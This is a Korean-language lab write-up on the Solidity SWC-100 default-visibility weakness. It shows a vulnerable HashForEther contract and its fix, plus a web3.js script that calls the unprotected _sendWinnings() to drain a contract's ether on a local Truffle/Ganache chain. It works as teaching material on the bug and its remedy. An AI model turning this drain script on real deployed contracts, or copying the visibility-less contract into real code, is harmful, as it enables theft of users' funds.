# swc100
### *SWC100 - Code*

 ***Vulnerability Contract*** 

```jsx
pragma solidity ^0.4.24;

contract HashForEther {

    function withdrawWinnings() {
        // Winner if the last 8 hex characters of the address are 0. 
        require(uint32(msg.sender) == 0);
        _sendWinnings();
     }

     function _sendWinnings() {
         msg.sender.transfer(this.balance);
     }
}
```
 ***Vulnerability Fix Contract***

```jsx
pragma solidity ^0.4.24;

contract HashForEther {

    function withdrawWinnings() public {
        // Winner if the last 8 hex characters of the address are 0.
        require(uint32(msg.sender) == 0);
        _sendWinnings();
     }

     function _sendWinnings() internal{
         msg.sender.transfer(this.balance);
     }
}
```

---

## 진행과정

### *swc100.sol*

- 해당 코드에서는 2가지의 함수가 존재함
    - withdrawWinnings(), _sendWinnings()

> *withrdrawWinnings()*

- uint32의 부호 없는 정수형으로 선언되어 있음
- `msg.sender`의 마지막 주소 값에 8개의 0이 존재해야 require를 만족하고 `_sendWinnings()` 함수를 호출할 수 잇음

> *_sendWinnings*

- 누구나 호출이 가능한 함수로, 아무 제약 없음
- 해당 함수를 호출한 사람에게, contract 주소가 가지고 있는 금액 전부를 전송함

---

### 가시성 지정자가 없는 상태로, 함수를 호출

1. swc100.sol

swc100 코드에는, contract 주소로 값을 전송할 수가 없음, 외부에서 값을 호출하여 출금해 갈 수 있는지 파악하기 위해서 임의의 `payable()` 함수를 선언

- swc100.sol code
    - *payable( )* 함수를 추가한 코드

```jsx
// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

contract HashForEther {
    function withdrawWinnings() public { 
        require(uint32(msg.sender) == 0,
        "msg.sender not 8hex 00000000");
        
        _sendWinnings();
     }

     function _sendWinnings() internal {    
        msg.sender.transfer(this.balance);
     }

     function a() payable{}
}
```

`payable` 함수를 사용해서, contract 주소에 eth 값을 전송 

- ethe 전송 명령어

```jsx
//to에 선언한 주소는, contract address
//값을 전송하면, 다음과 같이 balance 값이 증가함
truffle(develop)> test.a({value:web3.utils.toWei("3", "ether"), to: '0x8D6F74852a90e29dB9AD1Db90Ce7BE09dcf712A0'})
{
  tx: '0x580d3fe9d270c2d9e6b24049c9c4826d36eb4de564dea1b2ece6ea4541cdf698',
  receipt: {
    transactionHash: '0x580d3fe9d270c2d9e6b24049c9c4826d36eb4de564dea1b2ece6ea4541cdf698',
    transactionIndex: 0,
    blockHash: '0xd5c5b3fa05e594d93d139b4e388b9e394917fbb88b477701bc16c2259dd6b860',
    blockNumber: 422,
    from: '0x50a3c7460b3bd111b4330ac90f8410c7085298b7',
    to: '0x5c9bb80baf26226275f1d752a59afb3fed5452b6',
    gasUsed: 21173,
    cumulativeGasUsed: 21173,
    contractAddress: null,
    logs: [],
    status: true,
    logsBloom: '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
    rawLogs: []
  },
  logs: []
}

//ganache > contracts > HashForEther
ADDRESS : 0x5C9bB80BAf26226275F1d752a59AFb3fed5452b6 (migrate 할 때 마다 변경됨)
BALANCE : 3.00ETH (가지고 있는 이더 값)
CRATION TX : 0x7A38959BACBDbB185DACD4e159b53631a00BBd68d1b322741414a8208Bf0D377 (트랙잰션 ID)
```

2. 1_attack_migrate.js

migrate.js 파일은, 작성한 contract를 배포하기 위해서 작성하고, `truffle console` 에서 직접 함수를 호출할 수 있음

- migrations.js

```jsx
const HashForEther = artifacts.require("HashForEther");

module.exports = function (deployer) {
  deployer.deploy(HashForEther);
};
```

3. attack_test.js

`truffle console`에서 직접 함수를 호출하지 않고, `web3`이라는 javascript로 작성된 API를 활용하여 함수를 호출할 수 있음
web3.js API의 문법이나 기본 구조를 파악해야하며, truffle project와 같이 사용된다.
test는 contract를 배포하기 전에 테스트를 진행할 수 있음

- attack_test.js
    - JS 코드를 통해서, Contract에 `withdrawWinnings()` 함수와, `_sendWinnings()` 함수를 호출할 수 있음
    - 단, `_sendWinnings()` 함수만 필요하기 때문에, 해당 함수만 호출하여, `contract`에 있는 이더 값을 모두 출금할 수 있음
    - `node attack_test.js` 로 실행하면, 3eth를 넣어둔 contract 에서 모든 값을 출력해서 지정한 주소로 출금

```jsx
//node attack_test.js > 코드가 작성된 js 파일에 대한 테스트를 진행할 때 node 명령어를 사용
const Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider("http://127.0.0.1:9545"));
const test_json = require("../build/contracts/HashForEther.json");

const a = test_json["abi"];
const bytecode = test_json["bytecode"];

async function attack(){
    const attack = new web3.eth.Contract(a, "0x5C9bB80BAf26226275F1d752a59AFb3fed5452b6"); //contract address
    const account_list = await web3.eth.getAccounts();
    const account0_balance = await web3.eth.getBalance("0x50a3c7460b3bd111B4330ac90f8410c7085298b7"); //address owner
    console.log(account_list);
    console.log("accounts[0] =",account0_balance);
    
    //attack.methods.myMethod([param1[, param2[, ...]]])
    /*await attack.methods.withdrawWinnings().send({from: account0_balance, gas:100000, gasPrice:'200000' }).then(
        function(result){
            console.log(result);
        }
    );*/
}
async function attack_send(){
    const attack_send = new web3.eth.Contract(a, "0x5C9bB80BAf26226275F1d752a59AFb3fed5452b6"); //contract address
    const account_list = await web3.eth.getAccounts();
    
		//_sendWinnings 함수를 호출해서, 이더 값을 전송 받을 주소를 지정 ("0x8887~")하고 가스와 가스 값을 지정해줌
    await attack_send.methods._sendWinnings().send({from: "0x888775d42Eff5d828eFCB581C487AE2fB46f2045", gas:100000,gasPrice:'200000'}).then(
        function(res){
            console.log(res);
        }
    );
}   
attack_send();
```

4. 전체 과정

1. swc100.sol → 코딩 진행 및 `cmd> truffle compile`

2. migration.js 작성 → 작성한 계약을 이더리움 네트워크에 전파(로컬) 및 `cmd> migrate` 

3. test.js 작성 → web3 API를 활용해, 직접 함수를 호출하는 코드를 작성

4. test.js를 실행 `cmd> node test.js`

```jsx
truffle(develop)> compile
truffle(develop)> migrate / migrate --reset
truffle(develop)> HashForEther.deployed().then(function(instance){test=instance}) // 인스턴스 설정, 쉽게 사용하기 위함
truffle(develop)> test.a({value:web3.utils.toWei("18", "ether"), to: '0x8D6F74852a90e29dB9AD1Db90Ce7BE09dcf712A0'}) //이더 전송
//develop 빠져나와서 cmd에서 수행
cmd> node test.js
```

5. 트랜잭션 및 이더 값이 변경되는 것은 `ganache gui` 에서 확인 가능

- 트랜잭션 흐름 파악 가능, 블록 생성

### 결론

- 가시성 지정자 (public, private, internal, external)가 선언되어 있지 않은 경우, 외부 다른 계정이 해당 함수를 호출하여 이더 값을 출금해 갈 수 있음

---

### 가시성 지정자 선언

- 다음과 같이 public, internal 이라는 가시성 지정자를 선언했을 경우, 외부에서 해당 함수를 호출할 수 없음
    - `withdrawWinnings()`함수의 경우 호출할 수 있지만, `msg.sender`를 마지막 8자리가 0인 주소 값으로만 접근할 수 있음
    - public, internal을 지정
        - public은 누구나 호출할 수 있음, 공개됨
        - internal은 내부에서만 호출할 수 있음

```jsx
pragma solidity ^0.4.24;

contract HashForEther {

    function withdrawWinnings() public {
        // Winner if the last 8 hex characters of the address are 0.
        require(uint32(msg.sender) == 0);
        _sendWinnings();
     }

     function _sendWinnings() internal{
         msg.sender.transfer(this.balance);
     }
}
```

- _sendWinnings() 함수로 접근할 경우, 다음과 같이 예외처리가 발생하여 프로그램이 종료됨

```jsx
UnhandledPromiseRejectionWarning: TypeError: attack_send.methods._sendWinnings is not a function
```
